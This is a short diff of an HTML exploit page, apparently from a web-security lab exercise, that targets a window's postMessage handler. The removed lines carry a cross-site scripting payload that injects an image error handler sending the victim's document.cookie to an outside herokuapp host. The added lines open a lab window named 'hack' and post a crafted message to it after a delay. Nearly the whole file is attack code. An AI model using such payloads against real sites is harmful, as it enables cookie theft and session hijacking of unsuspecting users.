@@ -4,9 +4,9 @@
     <title>Test</title>
 </head>
 <body>
-    <iframe id="frame" src="http://ptl-fdd2d5de-c241c114.libcurl.so/"></iframe>
     <script>
-           setTimeout(function() { document.getElementById("frame").contentWindow.postMessage("<img src=a onerror='document.write(\"<img src=http://lab--work.herokuapp.com/?c=\"+document.cookie+\"/>\")'/>" ,'*');
+            var w = window.open("http://ptl-f896fafe-a1d1c2a3.libcurl.so/","hack");
+            setTimeout(function() { w.contentWindow.postMessage('user=test&id=0','*');
                                   },2000);
     </script>
 </body>
